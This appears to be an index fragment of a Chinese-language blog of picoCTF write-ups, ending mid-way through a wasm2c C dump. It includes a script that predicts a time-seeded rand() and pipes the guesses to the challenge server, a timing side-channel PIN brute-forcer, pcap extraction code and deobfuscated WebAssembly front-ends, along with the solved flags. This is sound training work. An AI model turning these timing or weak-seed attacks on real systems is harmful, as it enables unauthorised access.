The game is easy: you jump on a sPRiNG.\u0026#34;); puts(\u0026#34;How high will you fly?\u0026#34;); puts(\u0026amp;unk_A50); fflush(stdout); seed = time(0); srand(seed); for ( i = 1; i \u0026lt;= 30; ++i ) { printf(\u0026#34;LEVEL (%d/30)\\n\u0026#34;, i); puts(\u0026amp;unk_A50); LOBYTE(ans) = rand() \u0026amp; 0xF; ans = ans; printf(\u0026#34;Guess the height: \u0026#34;); fflush(stdout); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;guess_height); fflush(stdin); if ( ans != guess_height ) { puts(\u0026#34;WRONG! Sorry, better luck next time!\u0026#34;); fflush(stdout); exit(-1); } } puts(\u0026#34;Congratulation! You\u0026#39;ve won! Here is your flag:\\n\u0026#34;); fflush(stdout); get_flag(); fflush(stdout); return 0; } :::\nRecon # 看了1，才發現意外的簡單，就只是implement IDA分析的psuedo code，讓server和exploit的seed達成一致，原本看了老半天都沒發現明顯的洞，蠻有趣的，喜歡\nExploit # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main () { int i; srand(time(0)); for (i = 0; i \u0026lt; 30; i++) { printf(\u0026#34;%d\\n\u0026#34;, rand() \u0026amp; 0xf); } return 0; } $ gcc exp.c -o exp $ chmod 777 exp $ ./exp | nc jupiter.challenges.picoctf.org 34558 Flag: picoCTF{pseudo_random_number_generator_not_so_random_81b0dd7e}\nReference # seed-sPRiNG\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":313,"href":"/security/practice/picoctf/crypto/classic/picoctf---sequences/","title":"PicoCTF - Sequences","section":"Securities","content":" PicoCTF - Sequences # Source code # :::spoiler Source Code\nimport math import hashlib import sys from tqdm import tqdm import functools ITERS = int(2e7) VERIF_KEY = \u0026#34;96cc5f3b460732b442814fd33cf8537c\u0026#34; ENCRYPTED_FLAG = bytes.fromhex(\u0026#34;42cbbce1487b443de1acf4834baed794f4bbd0dfe2d6046e248ff7962b\u0026#34;) # This will overflow the stack, it will need to be significantly optimized in order to get the answer :) @functools.cache def m_func(i): if i == 0: return 1 if i == 1: return 2 if i == 2: return 3 if i == 3: return 4 return 55692*m_func(i-4) - 9549*m_func(i-3) + 301*m_func(i-2) + 21*m_func(i-1) # Decrypt the flag def decrypt_flag(sol): sol = sol % (10**10000) sol = str(sol) sol_md5 = hashlib.md5(sol.encode()).hexdigest() if sol_md5 != VERIF_KEY: print(\u0026#34;Incorrect solution\u0026#34;) sys.exit(1) key = hashlib.sha256(sol.encode()).digest() flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode() print(flag) if __name__ == \u0026#34;__main__\u0026#34;: sol = m_func(ITERS) decrypt_flag(sol) :::\nRecon # 這一題真的很詭異，具體也是看1的影片才知道一些工具可以解這種問題，首先題目的寫法會讓stack overflow，因為不斷往下recursion的結果就是記憶體爆掉，所以要做的事情就是要優化這個方程式\n直接用WolframAlpha這個強大的線上搜尋引擎，雖然是搜尋引擎但本身也可以解決數學的問題，直接打入: g(0)=1, g(1)=2, g(2)=3, g(3)=4, g(i)=55692*g(i-4) - 9549*g(i-3) + 301*g(i-2) + 21*g(i-1) 就可以顯示最後優化的結果為 $$ g(i)={{1612({-21})^i+30685\\times 2^{2i+5}\\times 3^i -1082829\\times 13^i+8349\\times 17^{i+1}} \\over 42636} $$ 有了優化後的方程式，就可以再次利用wolframalpha的解i=20000000的問題，直接打: (1612 (-21)^20000000 + 30685 2^(5 + 2 20000000) 3^20000000 - 1082829 13^20000000 + 8349 17^(1 + 20000000))/42636 mod 10^10000 因為看source code: 24的地方最後會mod 10**10000，所以直接加在後面就不用再多算一次 在result的地方會有more digit的button，一直按到所有digit都出來為止，然後就可以利用browser的inspector把所有digits尻出來 :::spoiler Whole Keyxploit - WolframAlpha # import sys import hashlib sys.set_int_max_str_digits(0) VERIF_KEY = \u0026#34;96cc5f3b460732b442814fd33cf8537c\u0026#34; ENCRYPTED_FLAG = bytes.fromhex(\u0026#34;42cbbce1487b443de1acf4834baed794f4bbd0dfe2d6046e248ff7962b\u0026#34;) def decrypt_flag(sol): sol_md5 = hashlib.md5(sol.encode()).hexdigest() if sol_md5 != VERIF_KEY: print(\u0026#34;Incorrect solution\u0026#34;) sys.exit(1) key = hashlib.sha256(sol.encode()).digest() flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode() print(flag) key = open(\u0026#39;./PicoCTF/Crypto/Sequences/key.txt\u0026#39;, \u0026#39;r\u0026#39;).read() decrypt_flag(key) Reference # picoGym (picoCTF) Exercise: Sequences \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":314,"href":"/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/","title":"PicoCTF - shark on wire 1","section":"Securities","content":" PicoCTF - shark on wire 1 # tags: PicoCTF CTF Misc # Challenge: shark on wire 1\nExploit - Analyze UDP stream # It transfer the single character by UDP protocol. Follow the UDP stream and you\u0026rsquo;ll get the flag "},{"id":315,"href":"/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/","title":"PicoCTF - shark on wire 2","section":"Securities","content":" PicoCTF - shark on wire 2 # Recon # 這一提出的很硬要，誰知道會把flag藏在這種地方，也沒有任何的提示，如果不是看1根本不知道這題要表達甚麼，也可能是我太蔡\nSimple Recon 首先做一些基本的recon，諸如dump files/string search/follow tcp or udp之類的，會發現UDP packets會有一些訊息出現，其中出現Start和一些a/b最後接著end Set filter as udp.port==22 會發現其中所有的len都一樣，就只有source port不一樣，同樣都是5xxx開頭，而後三位數就是flag Extract Flag 所以只要把所有的port擷取出來拚在一起，就可以拿到flag了 Exploit # import pyshark capture = pyshark.FileCapture(\u0026#39;./PicoCTF/Misc/shark on wire 2/capture.pcap\u0026#39;, display_filter=\u0026#39;udp.port == 22\u0026#39;) data = [] for pkt in capture: if pkt.udp.port != \u0026#39;5000\u0026#39;: data.append(chr(int(pkt.udp.port[1:]))) print(\u0026#34;\u0026#34;.join(data)) Flag: picoCTF{p1LLf3r3d_data_v1a_st3g0}\nReference # PicoCTF 2019 - shark on wire 2:-1:\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":316,"href":"/security/practice/picoctf/misc/general/picoctf---sidechannel/","title":"PicoCTF - SideChannel","section":"Securities","content":" PicoCTF - SideChannel # Description # There\u0026rsquo;s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you\u0026rsquo;ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.\nHint 1: Read about \u0026ldquo;timing-based side-channel attacks.\u0026rdquo; Hint 2: Attempting to reverse-engineer or exploit the binary won\u0026rsquo;t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it. Hint 3: Don\u0026rsquo;t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.\nRecon # 這一題也是直接看1才知道怎麼解，應該說原本大概也猜到是這樣解，但過程一直不順利，所以沒寫出來，最主要是一開始沒看hint所以reverse/binary exploitation花了太多時間，結果一無所獲，但大致上思路沒差多少，也就是輸入的pin digit如我是對的就會比一般錯誤的pin digit還要多花點時間處理，所以我們就可以鎖定每一個digit原本到底是甚麼\nExploit # from time import * from subprocess import * from tqdm import trange time_lapse = [] guess_pin = list(\u0026#34;99999999\u0026#34;) for i in trange(8): for j in range(10): guess_pin[i] = str(j) payload = \u0026#34;\u0026#34;.join(guess_pin) start = time_ns() p = Popen(\u0026#34;./pin_checker\u0026#34;, stdin=PIPE, stdout=PIPE, universal_newlines=True, shell=True) p.communicate(input=payload) time_lapse.append(time_ns() - start) guess_pin[i] = str(time_lapse.index(max(time_lapse))) time_lapse = [] print(\u0026#34;\u0026#34;.join(guess_pin)) 另外這隻程式不是百分百保證成功，還是要多跑幾次確定一下是不是每次都一樣再進行確認\n$ echo 48390513 | ./pin_checker Please enter your 8-digit PIN code: 8 Checking PIN... Access granted. You may use your PIN to log into the master server. $ echo 48390513 | nc saturn.picoctf.net 50364 Verifying that you are a human... Please enter the master PIN code: Password correct. Here\u0026#39;s your flag: picoCTF{t1m1ng_4tt4ck_9803bd25} Flag: picoCTF{t1m1ng_4tt4ck_9803bd25}\nReference # picoGym (picoCTF) Exercise: SideChannel \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":317,"href":"/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/","title":"PicoCTF - Sleuthkit Intro","section":"Securities","content":" PicoCTF - Sleuthkit Intro # tags: PicoCTF CTF Misc # Challenge: Sleuthkit Intro\nDescription # Download the disk image and use mmls on it to find the size of the Linux partition. Connect to the remote checker service to check your answer and get the flag. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.\nDownload disk image Access checker program: nc saturn.picoctf.net 52279 最新kali之mmls\nExploit - Follow the description # $ file disk.img.gz disk.img.gz: gzip compressed data, was \u0026#34;disk.img\u0026#34;, last modified: Tue Sep 21 19:34:53 2021, from Unix, original size modulo 2^32 104857600 $ gzip -d disk.img.gz $ ls disk.img $ mmls disk.img DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0000002047 0000002048 Unallocated 002: 000:000 0000002048 0000204799 0000202752 Linux (0x83) $ nc saturn.picoctf.net 52279 What is the size of the Linux partition in the given disk image? Length in sectors: 202752 202752 Great work! picoCTF{mm15_f7w!} "},{"id":318,"href":"/security/practice/picoctf/web/picoctf---some-assembly-required-1/","title":"PicoCTF - Some Assembly Required 1","section":"Securities","content":" PicoCTF - Some Assembly Required 1 # tags: PicoCTF CTF Web # Challenge: Some Assembly Required 1\nBackground # 了解 WebAssembly 的基礎使用方法\nSource code - After Beautify # :::spoiler source code\nconst strings = [\u0026#39;value\u0026#39;, \u0026#39;2wfTpTR\u0026#39;, \u0026#39;instantiate\u0026#39;, \u0026#39;275341bEPcme\u0026#39;, \u0026#39;innerHTML\u0026#39;, \u0026#39;1195047NznhZg\u0026#39;, \u0026#39;1qfevql\u0026#39;, \u0026#39;input\u0026#39;, \u0026#39;1699808QuoWhA\u0026#39;, \u0026#39;Correct!\u0026#39;, \u0026#39;check_flag\u0026#39;, \u0026#39;Incorrect!\u0026#39;, \u0026#39;./JIFxzHyW8W\u0026#39;, \u0026#39;23SMpAuA\u0026#39;, \u0026#39;802698XOMSrr\u0026#39;, \u0026#39;charCodeAt\u0026#39;, \u0026#39;474547vVoGDO\u0026#39;, \u0026#39;getElementById\u0026#39;, \u0026#39;instance\u0026#39;, \u0026#39;copy_char\u0026#39;, \u0026#39;43591XxcWUl\u0026#39;, \u0026#39;504454llVtzW\u0026#39;, \u0026#39;arrayBuffer\u0026#39;, \u0026#39;2NIQmVj\u0026#39;, \u0026#39;result\u0026#39;]; const search_string1 = function(id1, _0x53c021) { id1 = id1 - 470; let strings6f = strings[id1]; return strings6f; }; (function(id1, id2) { const search_string = search_string1; while (!![]) { try { const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5)); if (secret_key === id2) break; else id1[\u0026#39;push\u0026#39;](id1[\u0026#39;shift\u0026#39;]()); } catch (_0x41d31a) { id1[\u0026#39;push\u0026#39;](id1[\u0026#39;shift\u0026#39;]()); } } }(strings, 627907)); let exports; (async () =\u0026gt; { const search_string = search_string1; let _0x5f0229 = await fetch(search_string(489)), _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()), _0x1f8628 = _0x1d99e9[search_string(470)]; exports = _0x1f8628[\u0026#39;exports\u0026#39;]; })(); function onButtonPress() { const search_string = search_string1; let input_value = document[\u0026#39;getElementById\u0026#39;](search_string(484))[search_string(477)]; // document[\u0026#39;getElementById\u0026#39;](input)[value] for (let i = 0; i \u0026lt; input_value[\u0026#39;length\u0026#39;]; i++) { exports[search_string(471)](input_value[search_string(492)](i), i); } exports[\u0026#39;copy_char\u0026#39;](0, input_value[\u0026#39;length\u0026#39;]), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8); } :::\nExploit - Beautify JS + Analyze # Please check line 24, the process will fetch ./JIFxzHyW8W file at main webpage. We can check it out what this file is. Payload: mercury.picoctf.net:40226/JIFxzHyW8W Then the flag hide in the file you downloaded. :face_with_rolling_eyes:\nReference # parseInt\n"},{"id":319,"href":"/security/practice/picoctf/web/picoctf---some-assembly-required-2/","title":"PicoCTF - Some Assembly Required 2","section":"Securities","content":" PicoCTF - Some Assembly Required 2 # tags: PicoCTF CTF Web # Background # Source code # :::spoiler source\nconst list_str = [\u0026#39;copy_char\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;207aLjBod\u0026#39;, \u0026#39;1301420SaUSqf\u0026#39;, \u0026#39;233ZRpipt\u0026#39;, \u0026#39;2224QffgXU\u0026#39;, \u0026#39;check_flag\u0026#39;, \u0026#39;408533hsoVYx\u0026#39;, \u0026#39;instance\u0026#39;, \u0026#39;278338GVFUrH\u0026#39;, \u0026#39;Correct!\u0026#39;, \u0026#39;549933ZVjkwI\u0026#39;, \u0026#39;innerHTML\u0026#39;, \u0026#39;charCodeAt\u0026#39;, \u0026#39;./aD8SvhyVkb\u0026#39;, \u0026#39;result\u0026#39;, \u0026#39;977AzKzwq\u0026#39;, \u0026#39;Incorrect!\u0026#39;, \u0026#39;exports\u0026#39;, \u0026#39;length\u0026#39;, \u0026#39;getElementById\u0026#39;, \u0026#39;1jIrMBu\u0026#39;, \u0026#39;input\u0026#39;, \u0026#39;615361geljRK\u0026#39;]; const func1_cal = function(var_a, var_b) { var_a = var_a - 195; let list_strc4 = list_str[var_a]; return list_strc4; }; (function(var_a, var_b) { const func1_cal = func1_cal; while (!![]) { try { const var_c = -parseInt(func1_cal(200)) * -parseInt(func1_cal(201)) + -parseInt(func1_cal(205)) + parseInt(func1_cal(207)) + parseInt(func1_cal(195)) + -parseInt(func1_cal(198)) * parseInt(func1_cal(212)) + parseInt(func1_cal(203)) + -parseInt(func1_cal(217)) * parseInt(func1_cal(199)); if (var_c === var_b) break; else var_a[\u0026#39;push\u0026#39;](var_a[\u0026#39;shift\u0026#39;]()); } catch (_0x4f8a) { var_a[\u0026#39;push\u0026#39;](var_a[\u0026#39;shift\u0026#39;]()); } } }(list_str, 310022)); let exports; (async () =\u0026gt; { const func1_cal = func1_cal; let res_1 = await fetch(func1_cal(210)), res_2 = await WebAssembly[\u0026#39;instantiate\u0026#39;](await res_1[\u0026#39;arrayBuffer\u0026#39;]()), res_3 = res_2[func1_cal(204)]; exports = res_3[func1_cal(214)]; })(); function onButtonPress() { const func1_cal = func1_cal; let res_1 = document[func1_cal(216)](func1_cal(218))[func1_cal(197)]; for (let idx = 0; idx \u0026lt; res_1[\u0026#39;length\u0026#39;]; idx++) { exports[func1_cal(196)](res_1[func1_cal(209)](idx), idx); } exports[\u0026#39;copy_char\u0026#39;](0, res_1[func1_cal(215)]), exports[func1_cal(202)]() == 1 ? document[\u0026#39;getElementById\u0026#39;](func1_cal(211))[func1_cal(208)] = func1_cal(206) : document[func1_cal(216)](func1_cal(211))[\u0026#39;innerHTML\u0026#39;] = func1_cal(213); } :::\nExploit # 這一題也是想破頭了，首先應該很容易可以拿到前端驗證的code如上，beautify之後可以看到一個./aD8SvhyVkb的可疑檔案，取得之後發現是一個.wasm file\n$ file aD8SvhyVkb aD8SvhyVkb: WebAssembly (wasm) binary module version 0x1 (MVP) $ strings aD8SvhyVkb memory __wasm_call_ctors strcmp check_flag input copy_char __dso_handle __data_end __global_base __heap_base __memory_base __table_base j! F!!A !\u0026#34; ! \u0026#34;q!# # !% $ %q!\u0026amp; !( \u0026#39; (q!) \u0026amp; )k!* !+ + q! +xakgK\\Ns\u0026gt;\u0026lt;m:i1\u0026gt;1991:nkjl\u0026lt;ii1j0n=mm09;\u0026lt;i:u 感覺最後的字串有一點奇怪，丟到cyberchef用magic解看看，就出現flag了，其實就只是XOR 8而已 Flag: picoCTF{64e2a9691192fcbd4aa9b8f5ee8134a2}\nReference # picoCTF 2021 Some Assembly Required 2 "},{"id":320,"href":"/security/practice/picoctf/web/picoctf---some-assembly-required-3/","title":"PicoCTF - Some Assembly Required 3","section":"Securities","content":" PicoCTF - Some Assembly Required 3 # Background # WebAssembly/wabt\n$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c Source code # :::spoiler rTEuOmSfG3.js\n\u0026#39;use strict\u0026#39;; const str_list = [\u0026#34;exports\u0026#34;, \u0026#34;270328ewawLo\u0026#34;, \u0026#34;instantiate\u0026#34;, \u0026#34;1OsuamQ\u0026#34;, \u0026#34;Incorrect!\u0026#34;, \u0026#34;length\u0026#34;, \u0026#34;copy_char\u0026#34;, \u0026#34;value\u0026#34;, \u0026#34;1512517ESezaM\u0026#34;, \u0026#34;innerHTML\u0026#34;, \u0026#34;check_flag\u0026#34;, \u0026#34;result\u0026#34;, \u0026#34;1383842SQRPPf\u0026#34;, \u0026#34;924408cukzgO\u0026#34;, \u0026#34;getElementById\u0026#34;, \u0026#34;418508cLDohp\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;Correct!\u0026#34;, \u0026#34;573XsMMHp\u0026#34;, \u0026#34;arrayBuffer\u0026#34;, \u0026#34;183RUQBDE\u0026#34;, \u0026#34;38934oMACea\u0026#34;]; const tranfer_fn = function(url, whensCollection) { /** @type {number} */ url = url - 285; let _0x143f7d = str_list[url]; return _0x143f7d; }; (function(data, oldPassword) { const tranfer_fn = tranfer_fn; for (; !![];) { try { const userPsd = -parseInt(\u0026#34;length\u0026#34;) + -parseInt(\u0026#34;573XsMMHp\u0026#34;) + -parseInt(\u0026#34;innerHTML\u0026#34;) * -parseInt(\u0026#34;getElementById\u0026#34;) + -parseInt(\u0026#34;38934oMACea\u0026#34;) + parseInt(\u0026#34;value\u0026#34;) + -parseInt(\u0026#34;Incorrect!\u0026#34;) * -parseInt(\u0026#34;instantiate\u0026#34;) + parseInt(\u0026#34;arrayBuffer\u0026#34;); if (userPsd === oldPassword) { break; } else { data[\u0026#34;push\u0026#34;](data[\u0026#34;shift\u0026#34;]()); } } catch (_0x289152) { data[\u0026#34;push\u0026#34;](data[\u0026#34;shift\u0026#34;]()); } } })(str_list, 970828); let exports; (async() =\u0026gt; { const tranfer_fn = tranfer_fn; let rpm_traffic = await fetch(\u0026#34;./qCCYI0ajpD\u0026#34;); let m = await WebAssembly[\u0026#34;1512517ESezaM\u0026#34;](await rpm_traffic[\u0026#34;1OsuamQ\u0026#34;]()); let updatedEdgesById = m[\u0026#34;instance\u0026#34;]; exports = updatedEdgesById[\u0026#34;copy_char\u0026#34;]; })(); /** * @return {undefined} */ function onButtonPress() { const tranfer_fn = tranfer_fn; let data = document[\u0026#34;183RUQBDE\u0026#34;](\u0026#34;exports\u0026#34;)[\u0026#34;924408cukzgO\u0026#34;]; for (let i = 0; i \u0026lt; data[\u0026#34;result\u0026#34;]; i++) { exports[\u0026#34;1383842SQRPPf\u0026#34;](data[\u0026#34;charCodeAt\u0026#34;](i), i); } exports[\u0026#34;1383842SQRPPf\u0026#34;](0, data[\u0026#34;result\u0026#34;]); if (exports[\u0026#34;input\u0026#34;]() == 1) { document[\u0026#34;183RUQBDE\u0026#34;](\u0026#34;Correct!\u0026#34;)[\u0026#34;418508cLDohp\u0026#34;] = \u0026#34;270328ewawLo\u0026#34;; } else { document[\u0026#34;183RUQBDE\u0026#34;](\u0026#34;Correct!\u0026#34;)[\u0026#34;innerHTML\u0026#34;] = \u0026#34;check_flag\u0026#34;; } } ; :::\n:::spoiler dump.c\n/* Automatically generated by wasm2c */ #include \u0026lt;assert.h\u0026gt; #include \u0026lt;math.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; #include \u0026lt;stddef.h\u0026gt; #include \u0026lt;string.h\u0026gt; #if defined(__MINGW32__) #include \u0026lt;malloc.h\u0026gt; #elif defined(_MSC_VER) #include \u0026lt;intrin.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; #define alloca _alloca #elif defined(__FreeBSD__) || defined(__OpenBSD__) #include \u0026lt;stdlib.h\u0026gt; #else #include \u0026lt;alloca.h\u0026gt; #endif #include \u0026#34;dump.h\u0026#34; #define TRAP(x) (wasm_rt_trap(WASM_RT_TRAP_##x), 0) #if WASM_RT_USE_STACK_DEPTH_COUNT #define FUNC_PROLOGUE \\ if (++wasm_rt_call_stack_depth \u0026gt; WASM_RT_MAX_CALL_STACK_DEPTH) \\ TRAP(EXHAUSTION); #define FUNC_EPILOGUE --wasm_rt_call_stack_depth #else #define FUNC_PROLOGUE #define FUNC_EPILOGUE #endif #define UNREACHABLE TRAP(UNREACHABLE) static inline bool func_types_eq(const wasm_rt_func_type_t a, const wasm_rt_func_type_t b) { return (a == b) || LIKELY(a \u0026amp;\u0026amp; b \u0026amp;\u0026amp; !memcmp(a, b, 32)); } #define CALL_INDIRECT(table, t, ft, x, ...) \\ (LIKELY((x) \u0026lt; table.size \u0026amp;\u0026amp; table.data[x].func \u0026amp;\u0026amp; \\ func_types_eq(ft, table.data[x].func_type)) || \\ TRAP(CALL_INDIRECT), \\ ((t)table.data[x].func)(__VA_ARGS__)) #ifdef SUPPORT_MEMORY64 #define RANGE_CHECK(mem, offset, len) \\ do { \\ uint64_t res; \\ if (__builtin_add_overflow(offset, len, \u0026amp;res)) \\ TRAP(OOB); \\ if (UNLIKELY(res \u0026gt; mem-\u0026gt;size)) \\ TRAP(OOB); \\ } while (0); #else #define RANGE_CHECK(mem, offset, len) \\ if (UNLIKELY(offset + (uint64_t)len \u0026gt; mem-\u0026gt;size)) \\ TRAP(OOB); #endif #if WASM_RT_MEMCHECK_GUARD_PAGES #define MEMCHECK(mem, a, t) #else #define MEMCHECK(mem, a, t) RANGE_CHECK(mem, a, sizeof(t)) #endif #ifdef __GNUC__ #define wasm_asm __asm__ #else #define wasm_asm(X) #endif #if WABT_BIG_ENDIAN static inline void load_data(void* dest, const void* src, size_t n) { if (!n) { return; } size_t i = 0; u8* dest_chars = dest; memcpy(dest, src, n); for (i = 0; i \u0026lt; (n \u0026gt;\u0026gt; 1); i++) { u8 cursor = dest_chars[i]; dest_chars[i] = dest_chars[n - i - 1]; dest_chars[n - i - 1] = cursor; } } #define LOAD_DATA(m, o, i, s) \\ do { \\ RANGE_CHECK((\u0026amp;m), m.size - o - s, s); \\ load_data(\u0026amp;(m.data[m.size - o - s]), i, s); \\ } while (0) #define DEFINE_LOAD(name, t1, t2, t3) \\ static inline t3 name(wasm_rt_memory_t* mem, u64 addr) { \\ MEMCHECK(mem, addr, t1); \\ t1 result; \\ wasm_rt_memcpy(\u0026amp;result, \u0026amp;mem-\u0026gt;data[mem-\u0026gt;size - addr - sizeof(t1)], \\ sizeof(t1)); \\ wasm_asm(\u0026#34;\u0026#34; ::\u0026#34;r\u0026#34;(result)); \\ return (t3)(t2)result; \\ } #define DEFINE_STORE(name, t1, t2) \\ static inline void name(wasm_rt_memory_t* mem, u64 addr, t2 value) { \\ MEMCHECK(mem, addr, t1); \\ t1 wrapped = (t1)value; \\ wasm_rt_memcpy(\u0026amp;mem-\u0026gt;data[mem-\u0026gt;size - addr - sizeof(t1)], \u0026amp;wrapped, \\ sizeof(t1)); \\ } #else static inline void load_data(void* dest, const void* src, size_t n) { if (!n) { return; } memcpy(dest, src, n); } #define LOAD_DATA(m, o, i, s) \\ do { \\ RANGE_CHECK((\u0026amp;m), o, s); \\ load_data(\u0026amp;(m.data[o]), i, s); \\ } while (0) #define DEFINE_LOAD(name, t1, t2, t3) \\ static inline t3 name(wasm_rt_memory_t* mem, u64 addr) { \\ MEMCHECK(mem, addr, t1); \\ t1 result; \\ wasm_rt_memcpy(\u0026amp;result, \u0026amp;mem-\u0026gt;data[addr], sizeof(t1)); \\ wasm_asm(\u0026#34;\u0026#34; ::\u0026#34;r\u0026#34;(result)); \\ return (t3)(t2)result; \\ } #define DEFINE_STORE(name, t1, t2) \\ static inline void name(wasm_rt_memory_t* mem, u64 addr, t2 value) { \\ MEMCHECK(mem, addr, t1); \\ t1 wrapped = (t1)value; \\ wasm_rt_memcpy(\u0026amp;mem-\u0026gt;data[addr], \u0026amp;wrapped, sizeof(t1)); \\ } #endif DEFINE_LOAD(i32_load, u32, u32, u32) DEFINE_LOAD(i64_load, u64, u64, u64) DEFINE_LOAD(f32_load, f32, f32, f32) DEFINE_LOAD(f64_load, f64, f64, f64) DEFINE_LOAD(i32_load8_s, s8, s32, u32) DEFINE_LOAD(i64_load8_s, s8, s64, u64) DEFINE_LOAD(i32_load8_u, u8, u32, u32) DEFINE_LOAD(i64_load8_u, u8, u64, u64) DEFINE_LOAD(i32_load16_s, s16, s32, u32) DEFINE_LOAD(i64_load16_s, s16, s64, u64) DEFINE_LOAD(i32_load16_u, u16, u32, u32) DEFINE_LOAD(i64_load16_u, u16, u64, u64) DEFINE_LOAD(i64_load32_s, s32, s64, u64) DEFINE_LOAD(i64_load32_u, u32, u64, u64) DEFINE_STORE(i32_store, u32, u32) DEFINE_STORE(i64_store, u64, u64) DEFINE_STORE(f32_store, f32, f32) DEFINE_STORE(f64_store, f64, f64) DEFINE_STORE(i32_store8, u8, u32) DEFINE_STORE(i32_store16, u16, u32) DEFINE_STORE(i64_store8, u8, u64) DEFINE_STORE(i64_store16, u16, u64) DEFINE_STORE(i64_store32, u32, u64) #if defined(_MSC_VER) // Adapted from // https://github.com/nemequ/portable-snippets/blob/master/builtin/builtin.h static inline int I64_CLZ(unsigned long long v) { unsigned long r = 0; #if defined(_M_AMD64) || defined(_M_ARM) if (_BitScanReverse64(\u0026amp;r, v)) { return 63 - r; } #else if (_BitScanReverse(\u0026amp;r, (unsigned long)(v \u0026gt;\u0026gt; 32))) { return 31 - r; } else if (_BitScanReverse(\u0026amp;r, (unsigned long)v)) { return 63 - r; } #endif return 64; } static inline int I32_CLZ(unsigned long v) { unsigned long r = 0; if (_BitScanReverse(\u0026amp;r, v)) { return 31 - r; } return 32; } static inline int I64_CTZ(unsigned long long v) { if (!v) { return 64; } unsigned long r = 0; #if defined(_M_AMD64) || defined(_M_ARM) _BitScanForward64(\u0026amp;r, v); return (int)r; #else if (_BitScanForward(\u0026amp;r, (unsigned int)(v))) { return (int)(r); } _BitScanForward(\u0026amp;r, (unsigned int)(v \u0026gt;\u0026gt; 32)); return (int)(r + 32); #endif } static inline int I32_CTZ(unsigned long v) { if (!v) { return 32; } unsigned long r = 0; _BitScanForward(\u0026amp;r, v); return (int)r; } #define POPCOUNT_DEFINE_PORTABLE(f_n, T) \\ static inline u32 f_n(T x) { \\ x = x - ((x \u0026gt;\u0026gt; 1) \u0026amp; (T) ~(T)0 / 3); \\ x = (x \u0026amp; (T) ~(T)0 / 15 * 3) + ((x \u0026gt;\u0026gt; 2) \u0026amp; (T) ~(T)0 / 15 * 3); \\ x = (x + (x \u0026gt;\u0026gt; 4)) \u0026amp; (T) ~(T)0 / 255 * 15; \\ return (T)(x * ((T) ~(T)0 / 255)) \u0026gt;\u0026gt; (sizeof(T) - 1) * 8; \\ } POPCOUNT_DEFINE_PORTABLE(I32_POPCNT, u32) POPCOUNT_DEFINE_PORTABLE(I64_POPCNT, u64) #undef POPCOUNT_DEFINE_PORTABLE #else #define I32_CLZ(x) ((x) ? __builtin_clz(x) : 32) #define I64_CLZ(x) ((x) ? __builtin_clzll(x) : 64) #define I32_CTZ(x) ((x) ? __builtin_ctz(x) : 32) #define I64_CTZ(x) ((x) ? __builtin_ctzll(x) : 64) #define I32_POPCNT(x) (__builtin_popcount(x)) #define I64_POPCNT(x) (__builtin_popcountll(x)) #endif #define DIV_S(ut, min, x, y) \\ ((UNLIKELY((y) == 0)) \\ ? TRAP(DIV_BY_ZERO) \\ : (UNLIKELY((x) == min \u0026amp;\u0026amp; (y) == -1)) ? TRAP(INT_OVERFLOW) \\ : (ut)((x) / (y))) #define REM_S(ut, min, x, y) \\ ((UNLIKELY((y) == 0)) \\ ? TRAP(DIV_BY_ZERO) \\ : (UNLIKELY((x) == min \u0026amp;\u0026amp; (y) == -1)) ? 0 : (ut)((x) % (y))) #define I32_DIV_S(x, y) DIV_S(u32, INT32_MIN, (s32)x, (s32)y) #define I64_DIV_S(x, y) DIV_S(u64, INT64_MIN, (s64)x, (s64)y) #define I32_REM_S(x, y) REM_S(u32, INT32_MIN, (s32)x, (s32)y) #define I64_REM_S(x, y) REM_S(u64, INT64_MIN, (s64)x, (s64)y) #define DIVREM_U(op, x, y) \\ ((UNLIKELY((y) == 0)) ? TRAP(DIV_BY_ZERO) : ((x)op(y))) #define DIV_U(x, y) DIVREM_U(/, x, y) #define REM_U(x, y) DIVREM_U(%, x, y) #define ROTL(x, y, mask) \\ (((x) \u0026lt;\u0026lt; ((y) \u0026amp; (mask))) | ((x) \u0026gt;\u0026gt; (((mask) - (y) + 1) \u0026amp; (mask)))) #define ROTR(x, y, mask) \\ (((x) \u0026gt;\u0026gt; ((y) \u0026amp; (mask))) | ((x) \u0026lt;\u0026lt; (((mask) - (y) + 1) \u0026amp; (mask)))) #define I32_ROTL(x, y) ROTL(x, y, 31) #define I64_ROTL(x, y) ROTL(x, y, 63) #define I32_ROTR(x, y) ROTR(x, y, 31) #define 